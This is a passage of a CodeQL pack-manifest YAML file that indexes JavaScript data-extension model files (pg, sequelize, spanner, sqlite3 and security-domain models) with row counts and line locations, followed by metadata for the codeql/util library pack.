        relativePath: semmle/javascript/frameworks/pg/model.yml
        index: 2
        firstRowId: 1105
        rowCount: 23
        locations:
          lineNumbers: A=86+1*22
          columnNumbers: A=9*23
      - pack: codeql/javascript-all#1
        relativePath: semmle/javascript/frameworks/sequelize/model.yml
        index: 0
        firstRowId: 1128
        rowCount: 7
        locations:
          lineNumbers: A=6+1*6
          columnNumbers: A=9*7
      - pack: codeql/javascript-all#1
        relativePath: semmle/javascript/frameworks/sequelize/model.yml
        index: 1
        firstRowId: 1135
        rowCount: 248
        locations:
          lineNumbers: A=18+1*247
          columnNumbers: A=9*248
      - pack: codeql/javascript-all#1
        relativePath: semmle/javascript/frameworks/sequelize/model.yml
        index: 2
        firstRowId: 1383
        rowCount: 5
        locations:
          lineNumbers: A=271+1*4
          columnNumbers: A=9*5
      - pack: codeql/javascript-all#1
        relativePath: semmle/javascript/frameworks/sequelize/model.yml
        index: 3
        firstRowId: 1388
        rowCount: 2
        locations:
          lineNumbers: A=281+1
          columnNumbers: A=9*2
      - pack: codeql/javascript-all#1
        relativePath: semmle/javascript/frameworks/spanner/model.yml
        index: 0
        firstRowId: 1390
        rowCount: 174
        locations:
          lineNumbers: A=6+1*173
          columnNumbers: A=9*174
      - pack: codeql/javascript-all#1
        relativePath: semmle/javascript/frameworks/spanner/model.yml
        index: 1
        firstRowId: 1564
        rowCount: 5
        locations:
          lineNumbers: A=185+1*4
          columnNumbers: A=9*5
      - pack: codeql/javascript-all#1
        relativePath: semmle/javascript/frameworks/sqlite3/model.yml
        index: 0
        firstRowId: 1569
        rowCount: 15
        locations:
          lineNumbers: A=6+1*14
          columnNumbers: A=9*15
      - pack: codeql/javascript-all#1
        relativePath: semmle/javascript/frameworks/sqlite3/model.yml
        index: 1
        firstRowId: 1584
        rowCount: 3
        locations:
          lineNumbers: A=26+1*2
          columnNumbers: A=9*3
      - pack: codeql/javascript-all#1
        relativePath: semmle/javascript/security/domains/IntegrityCheckingRequired/integrity_checking_required.model.yml
        index: 0
        firstRowId: 1587
        rowCount: 3
        locations:
          lineNumbers: A=6+1*2
          columnNumbers: A=9*3
      - pack: codeql/javascript-all#1
        relativePath: semmle/javascript/security/domains/compromised/compromised_domains.model.yml
        index: 0
        firstRowId: 1590
        rowCount: 1
        locations:
          lineNumbers: A=6
          columnNumbers: A=9
      - pack: codeql/javascript-all#1
        relativePath: semmle/javascript/security/domains/untrusted/untrusted_domains.model.yml
        index: 0
        firstRowId: 1591
        rowCount: 6
        locations:
          lineNumbers: A=7+1+3+1*3
          columnNumbers: A=9*6
      - pack: codeql/threat-models#2
        relativePath: ext/supported-threat-models.model.yml
        index: 0
        firstRowId: 1597
        rowCount: 1
        locations:
          lineNumbers: A=6
          columnNumbers: A=9
      - pack: codeql/threat-models#2
        relativePath: ext/threat-model-grouping.model.yml
        index: 0
        firstRowId: 1598
        rowCount: 15
        locations:
          lineNumbers: A=8+3+1+3+1*5+3+1+5+1*3
          columnNumbers: A=9*15
  codeql/util#3:
    name: codeql/util
    version: 2.0.17
    isLibrary: true
    isExtensionPack: false
    localPath: file:///D:/Import-Manager/codeql/javascript-queries/2.0.3/.codeql/libraries/codeql/util/2.0.17/
    localPackDefinitionFile: file:///D:/Import-Manager/codeql/javascript-queries/2.0.3/.codeql/libraries/codeql/util/2.0.17/qlpack.yml
    headSha: 28f02c07d7d744d761520fbfb354f96827a11f6c
    runDataExtensions: []
